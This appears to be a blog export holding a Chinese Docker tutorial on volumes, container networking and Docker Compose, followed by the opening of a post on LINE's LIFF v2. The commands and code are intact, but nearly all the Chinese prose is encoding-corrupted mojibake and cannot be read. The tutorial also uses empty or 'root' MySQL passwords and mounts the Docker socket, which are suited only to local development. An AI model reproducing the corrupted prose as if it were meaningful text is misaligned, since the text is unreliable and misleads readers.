[ERROR] [Entrypoint]: Database is uninitialized and password option is not specified \u0026gt; You need to specify one of MYSQL_ROOT_PASSWORD, MYSQL_ALLOW_EMPTY_PASSWORD and MYSQL_RANDOM_ROOT_PASSWORD åœ¨å‰µå»º MySQL Container çš„åŒæ™‚ï¼Œä¹Ÿæœƒæ–°å¢ä¸€å€‹ Volumeï¼Œè¦å°‡è©² Volume ç§»é™¤ã€‚ 1 2 3 docker rm mysql1 docker volume ls docker volume rm [Volume id] å†æ¬¡å‰µå»ºä¸€å€‹ MySQL çš„ Containerã€‚ 1 docker run -d --name mysql1 -e MYSQL_ALLOW_EMPTY_PASSWORD=true mysql é€™æ™‚å€™æˆ‘å€‘å¯ä»¥å»æŸ¥çœ‹æ–°å¢çš„ Volume çš„ç´°ç¯€ï¼Œè£¡é¢å°±æœƒçœ‹åˆ°é€™å€‹ Volume é€£çµåˆ°æœ¬åœ°çš„ /var/lib/docker/volumes/[Volume id]/_data é€™å€‹ä½ç½®ã€‚ 1 2 docker volume ls docker volume inspect [Volume id] æˆ‘å€‘åœ¨å‰µå»ºç¬¬äºŒå€‹ MySQL çš„ Containerã€‚ 1 docker run -d --name mysql2 -e MYSQL_ALLOW_EMPTY_PASSWORD=true mysql é€™æ™‚å€™å† docker volume lsï¼Œå°±æœƒç™¼ç¾æ–°å¢äº†ä¸€å€‹æ–°å¢çš„ Volumeã€‚\næŠŠ Container åœæ­¢ä¸¦åˆªé™¤ï¼Œå†æŸ¥çœ‹ Container ç‹€æ…‹å°±æœƒç™¼ç¾æ²’æœ‰ä»»ä½•é€€å‡ºæˆ–åœ¨åŸ·è¡Œçš„ Container äº†ã€‚\n1 2 3 docker stop mysql1 mysql2 docker rm mysql1 mysql2 docker ps -a ä½¿ç”¨ docker volume ls æŸ¥çœ‹ Volumeï¼Œä¹‹å‰æ–°å¢çš„éƒ½é‚„åœ¨ï¼Œä½†æ˜¯æœƒç™¼ç¾å‘½åå¤ªè¤‡é›œï¼Œæˆ‘å€‘å¯ä»¥è‡ªå®šç¾© Volume åç¨±ï¼Œå…ˆæŠŠæ‰€æœ‰çš„ Volume ç§»é™¤ã€‚ 1 docker volume rm [volume1 id] [volume2 id] å‰µå»ºä¸€å€‹ MySQL çš„ Container ä¸¦æŒ‡å®š Volume åç¨±ç‚º mysqlï¼Œè·¯å¾‘ç‚º /var/lib/mysqlã€‚ 1 docker run -d -v mysql:/var/lib/mysql --name mysql1 -e MYSQL_ALLOW_EMPTY_PASSWORD=true mysql ä½¿ç”¨ docker volume ls æŸ¥çœ‹ Volumeï¼Œå°±æœƒçœ‹åˆ°æ–°å¢çš„ mysql Volumeã€‚\nç‚ºäº†é©—è­‰ MySQL çš„æ•¸æ“šæŒä¹…ï¼Œæˆ‘å€‘é€²å» mysql1 çš„ Container æ–°å¢ä¸€å€‹æ–°çš„ databaseï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # é€²å…¥ mysql1 container docker exec -it mysql1 /bin/bash # ç™»å…¥ MySQL mysql -u root # åˆ—å‡º DB show databases; # å»ºç«‹ DB create database docker; exit; exit åœæ­¢ä¸¦åˆªé™¤ Containerï¼š 1 docker rm -f mysql1 å‰µå»ºä¸€å€‹æ–°çš„ MySQL çš„ Containerï¼Œä¸¦é€£çµåˆ°ä¹‹å‰çš„ Volumeï¼š 1 docker run -d -v mysql:/var/lib/mysql --name mysql2 -e MYSQL_ALLOW_EMPTY_PASSWORD=true mysql é€²å» mysql2 çš„ Container æŸ¥çœ‹ databasesï¼Œæœƒç™¼ç¾ä¹‹å‰æ–°å¢çš„ Database é‚„å­˜åœ¨ï¼š 1 2 3 4 5 6 7 8 # é€²å…¥ mysql2 container docker exec -it mysql2 /bin/bash # ç™»å…¥ MySQL mysql -u root # åˆ—å‡º DB show databases; Docker Network Docker Network åŸç† æ¯å€‹ Container æœƒåŒ…å«ä¸€é …æœå‹™ï¼Œå¦‚å‰ç«¯ã€å¾Œç«¯ã€è³‡æ–™åº«ï¼ŒContainer ä¹‹é–“èƒ½ä¸èƒ½äº’ç›¸æºé€šè—‰æ­¤ä¸²è¯èµ·ä¸€å€‹æ›´å¤§çš„æœå‹™æ‡‰ç”¨å‘¢ï¼Ÿ å¯ä»¥çš„ï¼Œä»¥ä¸‹è¬›è§£ Docker Network çš„ç°¡å–®åŸç†ã€‚\ndocker network lsï¼š æŸ¥çœ‹æ‰€æœ‰ç¶²è·¯ã€‚ docker network inspect \u0026lt;NetworkName\u0026gt;ï¼š æª¢è¦–ç´°éƒ¨ç¶²è·¯è¨­å®šã€‚ æŸ¥çœ‹æ‰€æœ‰ç¶²è·¯å¯ä»¥ç™¼ç¾é»˜èªæœ‰åˆ†æˆ host èˆ‡ bridge ï¼ŒBridge æ˜¯ Linux çš„è™›æ“¬ç¶²è·¯æ©‹æ¥æŠ€è¡“ï¼Œå°‡ Bridge æ‰“é–‹å¯ä»¥ç™¼ç¾è£¡é¢åŒ…å«å…©å€‹ Containerï¼Œä¹Ÿå°±æ˜¯æˆ‘ä¸Šä¸€å€‹ç« ç¯€å»ºç«‹çš„ Web_App èˆ‡ Web_Volï¼ŒIP ä½ç½®åˆ†åˆ¥æ˜¯ 172.17.0.2ã€172.17.0.3ï¼Œè©³ç´°ç¶²è·¯æ¶æ§‹åœ–å¦‚ä¸‹ï¼š\nå®‰è£ Docker å¾Œæœƒæ–°å¢ä¸€å€‹ Docker ç¶²å¡é»˜èª IP ç‚º 172.17.0.1/16 (host)ï¼Œä»–æœƒæ¥æ”¶ä¾†è‡ªæœ¬ç¶²å¡(eth0)çš„è½‰ç™¼å°åŒ…ã€‚æ–°å»ºç«‹çš„ Container å‰‡æ˜¯æœƒè‡ªå‹•ç”Ÿæˆ IP 172.17.X.X ä¾åºæ’åˆ—ä¸‹å»ã€‚\nContainer äº’ç›¸è¨ªå• é‚£ Container çš„äº’ç›¸è¨ªå•å¾ˆç°¡å–®ï¼Œç›´æ¥è¨ªå• 172.17.X.X çš„ IP å°±å¥½äº†ï¼Œæˆ‘å€‘ä¾†å¯¦é©—çœ‹çœ‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 # é€²å…¥container docker exec -it Web_APP bash # æŸ¥çœ‹docker ç¶²è·¯ cat /etc/hosts # å®‰è£ç›¸é—œç¶²è·¯å·¥å…· apt-get update apt-get install curl # æ¸¬è©¦å»æŠ“å…¶ä»–Container curl 172.17.0.3 å¦‚ä¸‹åœ–ï¼Œæœ¬ Docker IP ç‚º 172.17.0.2ï¼Œå¯ä»¥æˆåŠŸæŠ“åˆ°å…¶ä»– Container çš„è³‡æ–™ã€‚\nNetwork æ˜ å°„ ä½†æ˜¯ Container çš„ IP ç‚ºè‡ªå‹•ç”Ÿæˆï¼Œæˆ‘å€‘çš„ç¨‹å¼åœ¨éƒ¨å±¬çš„æ™‚å€™ä¸å¯èƒ½éƒ¨å±¬ä¸Šå»å¾Œæ‰æ”¹ IPã€‚æœ‰ä¸€å€‹å¥½æ–¹æ³•ï¼Œåšç¶²è·¯æ˜ å°„ --linkã€‚\n1 docker run --link \u0026lt;å¤–éƒ¨Container\u0026gt;:\u0026lt;å…§éƒ¨Networkåç¨±\u0026gt; \u0026lt;ImageName\u0026gt; 1 2 3 4 5 6 7 8 # å»ºç«‹æ–°çš„æœ‰é€£çµçš„ APP å«åš Web_Network docker run -it -d --name Web_Network -p 8082:80 --link Web_APP:Web_APP --link Web_Vol:Web_Vol httpd:2.4 # é€²å…¥ Container docker exec -it Web_Network bash # æŸ¥çœ‹ Network cat /etc/hosts å¯ä»¥çœ‹åˆ° Network è‡ªå‹•å¤šäº†å…©å€‹ç¶²è·¯ IPï¼ŒWeb_APP èˆ‡ Web_Volã€‚\nç›´æ¥é€éåç¨±æŠ“æŠ“çœ‹ï¼š\n1 2 curl Web_APP curl Web_Vol æˆåŠŸç²å¾—ï¼š\nä¸éå¯¦å‹™ä¸Šä¹Ÿä¸æœƒé€é --link çš„æ–¹å¼ä¾†å»ºç«‹ Network æ˜ å°„ã€‚æ›´å¸¸ä½¿ç”¨çš„æœƒæ˜¯ docker-composeã€‚\nDocker Compose Docker Compose æ˜¯ä»€éº¼ï¼Ÿ å¤š Container çš„ App å¤ªéº»ç…© è¦ docker build image æˆ–æ˜¯å¾ Docker Hub pull Image è¦å‰µå»ºå¤šå€‹ container è¦ç®¡ç†é€™äº› container (å•Ÿå‹•å’Œåˆªé™¤) Docker Compose æ˜¯ä»€éº¼ Docker Compose æ˜¯ä¸€å€‹å·¥å…·(åŸºæ–¼ Docker çš„å‘½ä»¤åˆ—å·¥å…·) é€™å€‹å·¥å…·å¯ä»¥é€é YAML å®šç¾©å¤š Container çš„ Docker æ‡‰ç”¨ é€šéä¸€æ¢å‘½ä»¤å°±å¯ä»¥æ ¹æ“š YAML æ–‡ä»¶çš„å®šç¾©å»å‰µå»ºæˆ–ç®¡ç†å¤šå€‹ Container é»˜èªæ–‡ä»¶ï¼šdocker-compose.ymlï¼Œä¸‰å¤§æ¦‚å¿µï¼šServicesã€Networksã€Volumes Services ä¸€å€‹ Service ä»£è¡¨ä¸€å€‹ Containerï¼Œé€™å€‹ Container å¯ä»¥å¾ Docker Hub Image ä¾†å‰µå»ºï¼Œæˆ–æ˜¯å¾æœ¬åœ°çš„ Dockerfile build å‡ºä¾†çš„ Image ä¾†å‰µå»º Services çš„å•Ÿå‹•é¡ä¼¼ docker runï¼Œæˆ‘å€‘å¯ä»¥çµ¦å…¶æŒ‡å®š Network å’Œ Volume ä»¥ä¸‹ç”¨ docker-compose çš„ service å’Œ docker run ç”¢ç”ŸåŒæ¨£çš„å®¹å™¨ 1 2 3 4 5 6 7 8 9 10 11 # Docker Compose services: db: image: postgres:9.4 volumes: - \u0026#34;db-data:/var/lib/postgresql/data\u0026#34; networks: - back-tier # docker run # docker run -d --network back-tier -v db-data:/var/lib/postgresql/data postgres:9.4 Volumes å’Œ Networks åœ¨è·Ÿ services ä¸€æ¨£çš„ç´šåˆ¥åº•ä¸‹æœƒæœ‰ volumes å’Œ networks 1 2 3 4 5 6 7 8 9 10 11 12 # Docker Compose volumes: db-data networks: front-tier: driver: bridge back-tier: driver: bridge # docker volume èˆ‡ docker network # docker volume create db-data # docker network create -d bridge back-tier ç¯„ä¾‹ï¼šæ–°å¢ä¸€å€‹ WordPress çš„ docker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # docker-compose ç‰ˆæœ¬ version: \u0026#39;3\u0026#39; services: wordpress: image: wordpress ports: - 8080:80 environment: WORDPRESS_DB_HOST: mysql WORDPRESS_DB_PASSWORD: root networks: - my-bridge mysql: image: mysql:5.7 environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress volumes: - mysql-data:/var/lib/mysql networks: - my-bridge volumes: mysql-data: networks: my-bridge: driver: bridge ä½¿ç”¨ docker-compose.yml åœ¨è™›æ“¬æ©Ÿä¸Šå®‰è£ docker-composeï¼ŒæŒ‰ç…§å®˜æ–¹æ–‡ä»¶é€²è¡Œå®‰è£ã€‚ 1 2 3 4 5 # ä¸‹è¼‰ Docker Compose sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose # çµ¦äºˆæ¬Šé™ sudo chmod +x /usr/local/bin/docker-compose åœ¨å‰›å‰›å»ºç«‹ wordpress.yml çš„è³‡æ–™å¤¾å•Ÿå‹• Containerï¼Œé€™é‚Šçš„ -f é è¨­å°±æ˜¯ docker-compose.ymlï¼Œå¯ä»¥ä¸å¡«ã€‚ 1 2 3 docker-compose -f docker-compose.yml up # or # docker-compose up å¦‚æœåŸ·è¡Œ docker-compose up ä¹‹å¾Œå†ä½¿ç”¨ Command + C é€€å‡ºæœƒç›´æ¥åœæ­¢æœå‹™ï¼Œæ‰€ä»¥å¯ä»¥è®“æŒ‡ä»¤åœ¨å¾Œå°åŸ·è¡Œ docker-compose up -dï¼Œå¦‚æœæƒ³è¦ debug çœ‹ logï¼Œæ‰æœƒä½¿ç”¨ docker-compose upã€‚\ndocker-composer ç›¸é—œæŒ‡ä»¤ï¼š\ndocker-compose stopï¼š æœƒåœæ­¢æœå‹™ docker-compose downï¼š æœƒåˆªé™¤æ‰€æœ‰æœå‹™(åŒ…å« Cotainersã€Imagesã€Volumes å’Œ Networks) docker-compose startï¼š å¯ä»¥å•Ÿå‹•æœå‹™ docker-compose psï¼š æŸ¥çœ‹æœå‹™ç‹€æ…‹ docker-compose imagesï¼š æŸ¥çœ‹æ‰€æœ‰ Images docker-compose execï¼š å° Container åŸ·è¡ŒæŒ‡ä»¤ docker-compose exec å’Œ docker exec åŸºæœ¬ä¸Šæ˜¯ä¸€æ¨£çš„ï¼ŒåŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤å¯ä»¥ç›´æ¥é€²å» Container è£¡ï¼š 1 2 docker-compose exec mysql bash docker-compose exec wordpress bash å°‡ wordpress æœå‹™åœæ­¢ä¸¦åˆªé™¤ï¼š 1 docker-compose down æ–°å¢ docker-compose.ymlã€‚ docker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 version: \u0026#34;3\u0026#34; services: redis: image: redis web: build: context: . dockerfile: Dockerfile ports: - 8080:5000 environment: REDIS_HOST: redis æ–°å¢ Dockerfileã€‚ Dockerfile 1 2 3 4 5 6 7 FROM python:2.7 LABEL maintaner=\u0026#34;xxx@gmail.com\u0026#34; COPY . /app WORKDIR /app RUN pip install flask redis EXPOSE 5000 CMD [ \u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34; ] æ–°å¢ app.pyã€‚ app.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from flask import Flask from redis import Redis import os import socket app = Flask(__name__) redis = Redis(host=os.environ.get(\u0026#39;REDIS_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39;), port=6379) @app.route(\u0026#39;/\u0026#39;) def hello(): redis.incr(\u0026#39;hits\u0026#39;) return \u0026#39;Hello Container World! I have been seen %s times and my hostname is %s.\\n\u0026#39; % (redis.get(\u0026#39;hits\u0026#39;),socket.gethostname()) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000, debug=True) ä½¿ç”¨ docker-compose up å°±å¯ä»¥å•Ÿå‹•æœå‹™äº†ï¼Œé€™æ™‚å€™æ‰“é–‹æœ¬åœ°çš„ç€è¦½å™¨å°±å¯ä»¥çœ‹åˆ° flask çš„é é¢äº†ã€‚ æ°´å¹³æ“´å±•å’Œé™„è¼‰å‡è¡¡(é™„è¼‰å¹³è¡¡) ç”¨ docker-compose çš„ --scale å•Ÿå‹•ä¸‰å€‹ webï¼Œä½†æ˜¯æœƒå‡ºç¾éŒ¯èª¤ï¼Œæœƒé¡¯ç¤º 8080 å·²è¢«ä½”ç”¨ï¼š 1 docker-compose up --scale= web=3 -d ä¿®æ”¹ docker-compose.yml æŠŠ port åˆªé™¤ã€‚ docker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 version: \u0026#34;3\u0026#34; services: redis: image: redis web: build: context: . dockerfile: Dockerfile environment: REDIS_HOST: redis é€™æ™‚å€™åœ¨åˆ†åˆ¥åŸ·è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒContainer å°±æœƒè¢«å•Ÿå‹•ï¼š 1 2 docker-compose up -d docker-compose up --scale web=3 -d é—œé–‰æ‰€æœ‰çš„ Contaienrï¼š 1 docker-compose down ä¿®æ”¹ docker-compose.ymlï¼ŒåŠ ä¸Š loadbalancerã€‚ docker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 version: \u0026#34;3\u0026#34; services: redis: image: redis web: build: context: . dockerfile: Dockerfile environment: REDIS_HOST: redis lb: image: dockercloud/haproxy links: - web ports: - 8080:80 volumes: - /var/run/docker.sock:/var/run/docker.sock å•Ÿå‹• docker-composeï¼š 1 docker-compose up -d æŠŠç¶²é å…§å®¹è®€å–å‡ºä¾† curl 127.0.0.1:8080 æœƒè¿”å› Container çš„ IDï¼š 1 \u0026gt; Hello Container World! I have been seen 1 times and my hostname is 5620b14f864a. ç„¶å¾ŒæŠŠ web æœå‹™æ“´å±•æˆ 3 å€‹ï¼š 1 docker-compose up --scale web=3 -d å†æŠŠç¶²é å…§å®¹è®€å‡ºä¾†ï¼Œæœƒç™¼ç¾æœ‰ 3 å€‹ Container id æœƒè¼ªæµå‡ºç¾ï¼š 1 2 3 4 5 6 7 8 \u0026gt; Hello Container World! I have been seen 2 times and my hostname is 5620b14f864a. \u0026gt; Hello Container World! I have been seen 3 times and my hostname is 923de444e90d. \u0026gt; Hello Container World! I have been seen 4 times and my hostname is 1fde842de3f1. \u0026gt; Hello Container World! I have been seen 5 times and my hostname is 5620b14f864a. \u0026gt; Hello Container World! I have been seen 6 times and my hostname is 923de444e90d. \u0026gt; Hello Container World! I have been seen 7 times and my hostname is 1fde842de3f1. \u0026gt; Hello Container World! I have been seen 8 times and my hostname is 5620b14f864a. \u0026gt; Hello Container World! I have been seen 9 times and my hostname is 923de444e90d. æˆ‘å€‘ä¹Ÿå¯ä»¥æŠŠæœå‹™æ“´å±•æˆ 5 å°ï¼š 1 docker-compose up --scale web=5 -d é€™æ™‚å€™ç›´æ¥ curl 10 æ¬¡ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 for i in `seq 10`; do curl 127.0.0.1:8080; done \u0026gt; Hello Container World! I have been seen 10 times and my hostname is 5620b14f864a. \u0026gt; Hello Container World! I have been seen 11 times and my hostname is 923de444e90d. \u0026gt; Hello Container World! I have been seen 12 times and my hostname is 1fde842de3f1. \u0026gt; Hello Container World! I have been seen 13 times and my hostname is 37c3b132c4bd. \u0026gt; Hello Container World! I have been seen 14 times and my hostname is c2e3df63ddec. \u0026gt; Hello Container World! I have been seen 15 times and my hostname is 5620b14f864a. \u0026gt; Hello Container World! I have been seen 16 times and my hostname is 923de444e90d. \u0026gt; Hello Container World! I have been seen 17 times and my hostname is 1fde842de3f1. \u0026gt; Hello Container World! I have been seen 18 times and my hostname is 37c3b132c4bd. \u0026gt; Hello Container World! I have been seen 19 times and my hostname is c2e3df63ddec. åŒæ¨£åœ°ï¼Œä¹Ÿå¯ä»¥æ¸›å°‘æ“´å±•ï¼š 1 docker-compose up --scale web=3 -d Docker Compose æ˜¯ç”¨æ–¼æœ¬åœ°é–‹ç™¼çš„ä¸€å€‹å·¥å…·ï¼Œä¸¦ä¸é©åˆç”¨æ–¼ Productionï¼Œå®ƒå°±æ˜¯ç‚ºäº†æ–¹ä¾¿åœ¨æœ¬åœ°çœ‹éƒ¨ç½²çš„çµæœã€‚ ","date":"2023-02-02T00:00:00Z","image":"https://live.staticflickr.com/65535/52664455010_4df6e4bc0b_o.jpg","permalink":"https://wayneblog.ga/2023-02-02/docker-persistent-volume/","title":"ã€Dockerã€‘æ•¸æ“šæŒä¹…åŒ–èˆ‡æ•¸æ“šå…±äº« - tmpfsMount/BindMount/Volume"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næˆ‘æœ€æ—©æ¥è§¸ LIFF çš„æ™‚å€™å·²ç¶“æ˜¯ 2019 çš„æ™‚å€™äº†ï¼Œç•¶æ™‚çš„ LIFF v1 èˆ‡ç¾åœ¨çš„ LIFF v2 å·²ç¶“æœ‰äº†è »å¤§çš„å·®ç•°ï¼Œæˆ‘æƒ³é€éé€™ç¯‡æ–‡ç« æ¢³ç†ä¸€ä¸‹ LIFF v2 æ–°ç‰ˆæœ¬çš„ç‰¹æ€§ï¼Œå¥½è®“æˆ‘å€‘å¯ä»¥æ›´æ–¹ä¾¿çš„åœ¨ç¶²ç«™ä¸Šé€é LIFF æä¾› LINE ç”¨æˆ¶ä¸€äº›å¥½ç”¨åŠŸèƒ½ã€‚\næ­£ç¢ºç†è§£ LIFF çš„ç”¨é€” é›–ç„¶èªª LINE Front-end Framework (LIFF) å¾åå­—ä¸Šçœ‹èµ·ä¾†æ˜¯ä¸€å¥—ç”± LINE æ¨å‡ºçš„å‰ç«¯æ¡†æ¶ï¼Œä½†äº‹å¯¦ä¸Šä»–çš„ç”¨é€”æ¯”è¼ƒåƒæ˜¯ä¸€å€‹å‡½å¼åº«(Library)ï¼Œè®“ä½ å¯ä»¥åœ¨ LINE å¹³å°(LINE Platform) é †åˆ©çš„é–‹ç™¼ç¶²é æ‡‰ç”¨ç¨‹å¼(Web Application)ï¼Œå¹«åŠ©é–‹ç™¼äººå“¡å¯ä»¥è¼•é¬†çš„é€é LIFF æä¾›çš„ API è·Ÿ LINE ç”¨æˆ¶é€²è¡Œäº’å‹•ã€‚\nä»»ä½•å¾ LINE å¹³å°é–‹å•Ÿçš„ç¶²é ï¼Œè€Œç¶²é ä½¿ç”¨åˆ° LIFF æä¾›çš„ JavaScript SDKï¼Œéƒ½å¯ä»¥ç¨±ç‚ºæ˜¯ä¸€å€‹ LIFF Appsï¼\næ‰€ä»¥åœ¨ LINE å¹³å°ä¸Šé–‹ç™¼ç¶²é ï¼Œæ˜¯ä¸€å€‹ä»€éº¼æ¨£çš„æƒ…å¢ƒèˆ‡æ„Ÿå—å‘¢ï¼Ÿä»€éº¼åˆæ˜¯ LINE å¹³å°å‘¢ï¼Ÿäº‹å¯¦ä¸Šï¼ŒLINE é€™å®¶å…¬å¸ä¸ä½†æœ‰é¾å¤§çš„ç”¨æˆ¶åŸºç¤ï¼Œå®ƒå€‘æä¾›çš„å„é …æœå‹™ä¹Ÿæ˜¯ç³ç‘¯æ»¿ç›®ï¼Œæ‰€æœ‰æœå‹™çš„åŠ ç¸½ï¼Œå°±æ˜¯ LINE å¹³å°ï¼Œå¤§å®¶éƒ½å¯ä»¥åœ¨é€™å€‹å¹³å°ä¸Šé–‹ç™¼ Web æ‡‰ç”¨ç¨‹å¼ã€‚ä»¥ä¸‹æˆ‘ç”¨ä¸€å€‹æœ€æ·ºé¡¯æ˜“æ‡‚çš„ä½¿ç”¨æƒ…å¢ƒä¾†èªªæ˜ï¼š\nå‡è¨­æŸç”²ç¶“ç‡Ÿè‘—ä¸€å€‹åœ˜è³¼ç”Ÿæ„ï¼Œå®¢æˆ¶éƒ½æ˜¯é€é LINE å®˜æ–¹å¸³æˆ¶(Official Account) (ç°¡ç¨± LINE OA å¸³æˆ¶) é€²è¡Œè¯ç¹«ï¼Œç•¶æŸç”²æƒ³æä¾›ä»–çš„å®¢æˆ¶ä¸€å€‹åœ˜è³¼çš„è¡¨å–®æ™‚ï¼Œæœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯ç›´æ¥å‚³é€ä¸€å€‹é€£çµçµ¦ä»–çš„å®¢æˆ¶ï¼Œè€Œé€™å€‹é€£çµå°±æ˜¯ä¸€å€‹ã€Œç¶²é ã€ä¸¦æ“æœ‰ä¸€å€‹ã€Œç¶²å€ã€å°å§ï¼å¦‚æœä½ æ˜¯ Web é–‹ç™¼äººå“¡ï¼Œå°±å¯ä»¥åœ¨é€™ä»½ã€Œç¶²é ã€ä¸­åŠ å…¥ LIFF SDKï¼Œä¸¦ä½¿ç”¨ LIFF SDK æä¾›çš„ API ä¾†å–å¾—å®¢æˆ¶åŸºæœ¬è³‡æ–™ï¼Œæˆ–æ˜¯è¨­è¨ˆä¸€äº›ä¾¿åˆ©çš„ Web UI ä»‹é¢å¹«åŠ©å®¢æˆ¶åœ¨ LINE èŠå¤©å®¤ä¸­ä¸‹å–®ã€‚é€™å°±æ˜¯ä¸€å€‹ LIFF App çš„ç¶“å…¸ä½¿ç”¨æƒ…å¢ƒï¼ğŸ‘\nè¦èªè­˜ LIFF æœ€å¿«çš„æ–¹å¼ï¼Œå°±æ˜¯ç›´æ¥é–‹å•Ÿ LIFF Playground ç¶²é ï¼Œå¿«é€Ÿé è¦½æ‰€æœ‰ LIFF SDK æä¾›çš„å„é …åŠŸèƒ½ï¼Œè®“ä½ å¾ˆæ¸…æ¥šçš„çŸ¥é“ LIFF å¯ä»¥åšå“ªäº›äº‹ï¼ä»¥ä¸‹æˆ‘åˆ—å‡ºå¹¾å€‹ LIFF Playground çš„äº®é»ï¼š\nå¹«åŠ© LINE ç”¨æˆ¶ç™»å…¥/ç™»å‡ºï¼š\näº‹å¯¦ä¸Šï¼Œé€™äº›ä½¿ç”¨åˆ° LIFF SDK çš„ LIFF Apps ä¸¦ä¸ä¸€å®šè¦è·‘åœ¨ LINE App ä¹‹ä¸­ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œä»–ä¸ä¸€å®šè¦ç›´æ¥å¾ LINE App é–‹å•Ÿé€™ä»½ç¶²é ã€‚é€™å€‹ LIFF Apps å…¶å¯¦ä¹Ÿå¯ä»¥æ˜¯ä¸€å€‹ç¨ç«‹ç¶²é ï¼Œåœ¨ä»»ä½•ä¸€å°é›»è…¦æˆ–æ‰‹æ©Ÿé–‹å•Ÿç¶²é ä¹Ÿè¡Œã€‚åªæ˜¯åœ¨ LINE App ä¹‹ä¸­é–‹å•Ÿç¶²é å¯ä»¥çœå»ã€Œç™»å…¥ã€çš„ç¨‹åºï¼Œä½¿ç”¨è€…çš„æ“ä½œé–€æª»æœƒæ›´ä½ä¸€äº›ï¼\nå–å¾— LINE ç”¨æˆ¶çš„è£ç½®è³‡è¨Šï¼š\nä½ å¯ä»¥é€é LIFF SDK æä¾›çš„ API å–å¾—ä½¿ç”¨è€…çš„ä½œæ¥­ç³»çµ±(OS)ã€ä½¿ç”¨çš„èªè¨€(Language)ã€ç›®å‰ LIFF SDK ä½¿ç”¨çš„ç‰ˆæœ¬ã€ç›®å‰ LINE App çš„ç‰ˆæœ¬ã€åˆ¤æ–·ç¶²é æ˜¯å¦é–‹åœ¨ LIFF Browser ä¹‹ä¸­ã€åˆ¤æ–·ç”¨æˆ¶ç›®å‰æ˜¯å¦æ˜¯ç™»å…¥ç‹€æ…‹ã€åˆ¤æ–·ç”¨æˆ¶ç›®å‰ç’°å¢ƒå¯ä»¥ä½¿ç”¨å“ªäº› LIFF APIã€‚\nå–å¾— LINE ç”¨æˆ¶åŸºæœ¬è³‡æ–™ï¼š\nå–å¾—ç”¨æˆ¶çš„ Access Tokenã€å–å¾—ç”¨æˆ¶çš„ ID Tokenã€å–å¾— ID Token è§£é–‹å¾Œçš„å…§å®¹ã€å–å¾— Context è³‡è¨Šã€å–å¾—åŸºæœ¬è³‡æ–™(åªæœ‰ä½¿ç”¨è€…å”¯ä¸€å€¼ã€é¡¯ç¤ºåç¨±èˆ‡å¤§é ­ç…§)ã€å–å¾—èˆ‡ LINE OA ä¹‹é–“çš„å¥½å‹ç‹€æ…‹ã€‚\nå¼·åŒ– UI äº’å‹•çš„å°åŠŸèƒ½ï¼š\nä½ å¯ä»¥åœ¨ LIFF æ°¸ä¹…é€£çµä¸ŠåŠ å…¥é¡å¤–åƒæ•¸ã€å¯ä»¥å¹« LINE ç”¨æˆ¶ç›´æ¥é€å‡ºè¨Šæ¯åˆ° OA å¸³æˆ¶çš„èŠå¤©å®¤ä¸­ã€å¾ LIFF Browser é–‹å•Ÿé€£çµåˆ°æ–°è¦–çª—ã€å¾ LIFF Browser é—œé–‰è¦–çª—ã€åˆ†äº«è³‡è¨Šçµ¦å¥½å‹ã€å–å¾— QRCode æƒæçµæœã€‚\nç•¶ä½ å·²ç¶“ç­è§£ LIFF ç”¨é€”ä¹‹å¾Œï¼Œé–‹ç™¼äººå“¡å°±å¯ä»¥ç›´æ¥çœ‹ LIFF v2 API reference åƒè€ƒæ–‡ä»¶ï¼Œé€™è£¡æœ‰æ›´å¤š LIFF SDK èˆ‡ API çš„æŠ€è¡“ç´°ç¯€ã€‚\næ­£ç¢ºç†è§£ LIFF Browser çš„ç”¨é€” åœ¨ LINE å¹³å°ä¸­å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ 4 ç¨®ç€è¦½å™¨é¡å‹ï¼Œå¾ˆå¤šäººæä¸æ¸…æ¥šå…¶ä¸­çš„å·®åˆ¥ï¼Œæˆ‘ç‰¹åˆ¥é‡é»èªªæ˜ä¸€ä¸‹ï¼š\nLINE In-App Browser LINE In-App Browserï¼š\nåœ¨ LINE App ä»»æ„ä½ç½®é–‹å•Ÿçš„é€£çµï¼Œé è¨­éƒ½æœƒé–‹å•Ÿä¸€å€‹å…§åµŒåœ¨ LINE App ä¸­çš„ç€è¦½å™¨ï¼Œé€™ç¨®ç€è¦½å™¨å¹¾ä¹èˆ‡ä¸€èˆ¬ç€è¦½å™¨ç„¡ç•°ï¼Œä½†å…¶å¯¦åœ¨ä½¿ç”¨ä¸Šæœ‰è«¸å¤šé™åˆ¶ï¼Œå»ºè­°é–‹ç™¼äººå“¡ä¸è¦æŠŠä»–ç•¶æˆã€Œæ­£å¸¸ã€çš„ç€è¦½å™¨ä¾†ä½¿ç”¨ï¼Œç•¶æˆã€Œé–±è®€ç¶²é å…§å®¹ã€çš„å·¥å…·æœƒæ¯”è¼ƒå¥½ä¸€äº›ï¼Œä¸è¦åšå¤ªå¤šéœ€è¦ç™»å…¥æ‰èƒ½ç”¨çš„åŠŸèƒ½åœ¨ä¸Šé¢ã€‚\nLINE In-App Browser é›–ç„¶æ”¯æ´ Cookies èˆ‡ localStorage æ“ä½œï¼Œä½†æ²’äººä¿è­‰å¯ä»¥å„²å­˜å¤šä¹…ï¼Œå¯èƒ½ App 